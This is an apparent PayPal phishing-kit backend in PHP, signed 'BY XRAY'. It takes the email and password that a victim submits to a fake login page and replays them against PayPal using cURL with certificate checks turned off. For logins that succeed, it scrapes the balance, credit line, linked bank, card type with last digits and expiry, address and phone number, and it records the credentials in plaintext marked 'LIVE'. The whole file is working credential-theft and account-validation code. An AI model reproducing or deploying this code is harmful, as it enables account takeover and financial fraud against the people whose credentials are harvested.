<?php

#################################################
#                                               #
#            ||~~ BY ~~ XRAY ~~||             #
#                                               #
#            ||~  ~||             #
#                                               #
#################################################
error_reporting(0);
session_start();

include("../../config/function.php");

include("lang/". $_SESSION['_lang_'].".php");

set_time_limit(0);

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

$email = $_SESSION['_email_'] = $_POST['email'];

$pwd = $_SESSION['_password_'] = $_POST['password'];

$_SESSION['cntcode'] = $countrycode;

$_SESSION['cntname'] = $countryname;

$var = 'login_cmd=&login_params=&login_email='.rawurlencode($email) .'&login_password='.rawurlencode($pwd) .'&target_page=0&submit.x=Log+In&form_charset=UTF-8&browser_name=Firefox&browser_version=17&browser_version_full=17.0&operating_system=Windows';

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

function curl($url = '', $var = '', $header = false, $nobody = false)
{
    global $config, $sock;
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_NOBODY, $header);
    curl_setopt($curl, CURLOPT_HEADER, $nobody);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.9 (KHTML, like Gecko) Maxthon/3.0 Safari/533.9');
    curl_setopt($curl, CURLOPT_REFERER, 'https://www.paypal.com/webscr?cmd=_run-check-cookie-submit&redirectCmd=_login-submit');
    if ($var) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
    }
    curl_setopt($curl, CURLOPT_COOKIEFILE, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

function fetch_value($str, $find_start, $find_end)
{
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

$dir                   = dirname(__FILE__);
$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
if (!file_exists($config['cookie_file'])) {
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

$zzz  = "";
$live = array();

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

function get($list)
{
    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);
    return $socks[0];
}

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

function delete_cookies()
{
    global $config;
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

function Error(){ 
		$i = header("Location: login.php?country.x=".$_SESSION['cntname']."-".$_SESSION['cntcode']."&lang.x=".$_SESSION['_lang_']."&error=true");
        return $i; 
}

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

function xflush()
{
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
    if ($output_handler == 'ob_gzhandler') {
        return;
    }
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

function getCookies($str){
	preg_match_all('/Set-Cookie: ([^; ]+)(;| )/si', $str, $matches);
	$cookies = implode(";", $matches[1]);
	return $cookies;
}

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

function array_remove_empty($arr)
{
    $narr = array();
    while (list($key, $val) = each($arr))
    {
        if (is_array($val))
        {
            $val = array_remove_empty($val);
            // does the result array contain anything?
            if (count($val) != 0)
            {
                // yes :-)
                $narr[$key] = trim($val);
            }
        } else
        {
            if (trim($val) != "")
            {
                $narr[$key] = trim($val);
            }
        }
    }
    unset($arr);
    return $narr;
}

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

function display($m, $t = 1, $d = 0)
{
    if ($t == 1)
    {
        echo '<div>' . $m . '</div>';
    } else
    {
        echo $m;
    }
    if ($d)
    {
        exit;
    }
}

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

function inStr($s,$as){ 
        $s=strtoupper($s); 
        if(!is_array($as)) $as=array($as); 
        for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true; 
        return false; 
} 

#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#






if ( ( isset($_POST['email']) ) && (strlen($_POST['password']) >= 8)) {

    delete_cookies();
    
	#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

	//$sock = urldecode($_REQUEST['sock']);
	
	#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

    if (curl('https://www.paypal.com/','',true,true) === false) { continue; /* WITH OUT SOCKS */ }
	
	#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#
	
	$var = 'login_cmd=&login_params=&login_email='.rawurlencode($email) .'&login_password='.rawurlencode($pwd) .'&target_page=0&submit.x=Log+In&form_charset=UTF-8&browser_name=Firefox&browser_version=17&browser_version_full=17.0&operating_system=Windows';
    
	$page = curl("https://www.paypal.com/webscr?cmd=_run-check-cookie-submit&redirectCmd=_login-submit", $var);
	
	$title = fetch_value($page, '<title>', '</title>');
	
	#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

	if (inStr($page, 's.prop14=')) {
			Error(); //Error Login - J7
	}else{
			$loggedIn = curl("https://www.paypal.com/webscr?cmd=_account&nav=0.0");
		
	#--[//echo $page;]---------------------------------------------------||~~ BY ~~ XRAY ~~||----

			if($title == "Security Measures - PayPal"){
			//Security Measures
			}elseif (stripos($loggedIn, 'PayPal balance') !== false || stripos($loggedIn, 'Log Out</a>') !== false) {
					
	#--[//Security Measures]---------------------------------------------||~~ BY ~~ XRAY ~~||----

	                //ACCOUNT_PAGE//
					$_SESSION['_balance_'] = $loggedIn  = preg_replace('/<!--google(off|on): all-->/si', '', $loggedIn);
					//ACCOUNT_PAGE//
					
					$loggedIn     = preg_replace('/\n+/si', '', $loggedIn);
					$pp['type']   = fetch_value($loggedIn, 's.prop7="', '"');

					$_SESSION["_id_"]  =  $pp['id']   = fetch_value($loggedIn, 's.prop6="', '"');
					$_SESSION["_N1_"] = $pp['N1']   = fetch_value($loggedIn, 's.prop20="', '"');
					
					//ACCOUNT_TYPE//
					$_SESSION['_accounttype_'] = $pp['type']   = '<span class="' . $pp['type'] . '">' . ucfirst($pp['type']) . '</span>';
					//ACCOUNT_TYPE//
					
					$pp['status'] = fetch_value($loggedIn, 's.prop8="', '"');
					$pp['status'] = '<span class="' . $pp['status'] . '">' . ucfirst($pp['status']) . '</span>';
					
	#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#

					if (inStr($loggedIn, 'Your account access is limited')) {
						$pp['limited'] = '<font color="red">Limited</font>';
					}	
					
    #--[//PPBALANCE]-----------------------------------------------------||~~ BY ~~ XRAY ~~||----
					
					if(inStr($loggedIn, '<div class="balanceNumeral"><span class="h2">')){
						$pp['bl'] = fetch_value($loggedIn, '<div class="balanceNumeral"><span class="h2">', '</span>');
					}else{
						$pp['bl'] = fetch_value($loggedIn, '<span class="balance">', '</span>');
					}
					
	#--[//PPBALANCE_NEGATIVE]--------------------------------------------||~~ BY ~~ XRAY ~~||----
				
				    if ($pp['bl']) {
						if (inStr($pp['bl'], 'strong')) {
						$pp['bl'] = trim(fetch_value($pp['bl'], '<strong>', '</strong>'));
						}
					} else {
						$pp['bl'] = fetch_value($loggedIn, '<span class="balance negative">', '</span>');
					}
					
	#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#
					
					$pp['lastloggin'] = strip_tags(fetch_value($loggedIn, '<div class="small secondary">', '</div>'));

					//LAST_LOGIN//
					$_SESSION['_lastloggin_'] = $pp['lastloggin'] = str_replace('Last log in', '', $pp['lastloggin']);
					//LAST_LOGIN//
					
					//ACCOUNT_FULL_INFO//
					$_SESSION['_msg_'] = $result['msg'] = '<b style="color:green;">LIVE</b> =>  | ' . $email . ' | ' . $pwd . ' | ' . implode(' | ', $pp) . ' ||~~ BY ~~ XRAY ~~||';
                    //ACCOUNT_FULL_INFO//
					
	#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#
				
					if (!$pp['limited']) {
						
	#--[//PPSMART]-------------------------------------------------------||~~ BY ~~ XRAY ~~||----
	
						$ppsmart = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&nav=0.0");
						if (inStr($ppsmart, 'PayPal Smart Connect')) {
							$smartnum	= fetch_value($ppsmart, 'PayPal Smart Connect<span>', '</span>');
							$smartccn	= "SmartConnect[" . $smartnum . "]";							
							
							//SMART_INFO//
							$_SESSION['_smart_'] = $pp['smart'] = $smartccn;
							//SMART_INFO//
							
						}else{
							
							//SMART_INFO//
							$_SESSION['_smart_'] = $pp['smart'] = "No SmartConnect";
							//SMART_INFO//
							
						}
						
	#--[//PPBMLT]--------------------------------------------------------||~~ BY ~~ XRAY ~~||----	
	
						$ppbmlt = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&nav=0.0");
						if (inStr($ppbmlt, 'Bill Me Later')) {
							$bmlbalance  = fetch_value($ppbmlt, 'Available credit: <span class="heavy">', '</span>');
							$bmlcredit	 = "BML Credit: <font color='gold'>" . $bmlbalance . "</font>";
							
							//BMLT_INFO//
							$_SESSION['_bmlt_'] = $pp['bmlt'] = $bmlcredit;
							//BMLT_INFO//
							
						}else{
							
							//BMLT_INFO//
							$_SESSION['_bmlt_'] = $pp['bmlt'] = "No Bill Me Laster";
							//BMLT_INFO//
							
						}
						
	#--[//PPBANK]-------------------------------------------------------||~~ BY ~~ XRAY ~~||----	

						$ppbank = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach&nav=0.5.1");
						if (inStr($ppbank, 'ach_id')) {
							
							//BANK_INFO//
							$_SESSION['_bank_'] = $pp['bank'] = "Have Bank";
							//BANK_INFO//
							
						}else{
							
							//BANK_INFO//
							$_SESSION['_bank_'] = $pp['bank'] = "No Bank";
							//BANK_INFO//
							
						}
						
	#--[//PPCARD]------------------------------------------------------||~~ BY ~~ XRAY ~~||----	
						
						$ppcard = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&flag_from_account_summary=1&nav=0.5.2");
						$checkcard = fetch_value($ppcard,'s.prop1="','"');
						if (stripos($checkcard,'ccadd') !== false) {
							
							//CARD_FULL_INFO//
							$_SESSION['_card_'] = $pp['card'] = "No Card";
							//CARD_FULL_INFO//
							
						}else{
						preg_match_all('/<tr>(.+)<\/tr>/siU',$ppcard,$matches);
						$cc = array();
						foreach ($matches[1] AS $k =>$v) {
							if ($k >0) {
								preg_match_all('/<td>(.+)<\/td>/siU', $v, $m);
								
								//CARD_TYPE//
								$_SESSION['_cctype_'] = $type = strtoupper(fetch_value($m[1][0],'&#x2f;icon&#x5f;','&#x2e;gif'));
								//CARD_TYPE//
								
								//CARD_LAST_4_NUMBERS//
								$_SESSION['_ccnum_'] = $ccnum = $m[1][1];
								//CARD_LAST_4_NUMBERS//
								
								//CARS_EXP//
								$_SESSION['_ccexp_'] = $exp = $m[1][2];
								//CARS_EXP//
								
								if (stristr($m[1][4],'complete_expanded_use.x')) {
									
									//CARD_CONFIRMATION//
									$_SESSION['_card_confirmation'] = $confirmed = 'No Confirmed';
									//CARD_CONFIRMATION//
									
								}else{
									
									//CARD_CONFIRMATION//
									$_SESSION['_card_confirmation'] = $confirmed = 'Confirmed';
									//CARD_CONFIRMATION//
									
								}
								$cc[] = "$type  XXXX-XXXX-XXXX-$ccnum  $confirmed  -  $exp";
								$cc++;
							}
						}
						
						//CARD_FULL_INFO//
						$_SESSION['_card_'] = $pp['card'] = "<font color=\"#EDAD39\">".implode("-",$cc) ."</font>";
						//CARD_FULL_INFO//
						
						}
						
	#--[//PPADD]---------------------------------------------------------||~~ BY ~~ XRAY ~~||----	

						$ppadd = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&nav=0.6.3");
						$infoAddr = str_replace('<br>', ', ', fetch_value($ppadd, 'emphasis">', '</span>'));
						$_SESSION['_ad_'] = $pp['address'] = substr($infoAddr, 0, -2);
						
	#--[//PPPHONE]-------------------------------------------------------||~~ BY ~~ XRAY ~~||----	

						$ppphone = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-phone&nav=0.6.4");
						
						//PHONE_NUMBER//
						$_SESSION['_phone_'] = $pp['phone'] = strip_tags('<input type="hidden" ' . fetch_value($ppphone, 'name="phone"', '</label>'));	
						//PHONE_NUMBER//
						
                        header("Location: J1.php?");						
					}
			    }else{
				#------------------------------||~~ BY ~~ XRAY ~~||-------------------------------#
				Error(); //Error Login - J7
			}  
	}
}else{
Error(); //Error Login - J7
}
?>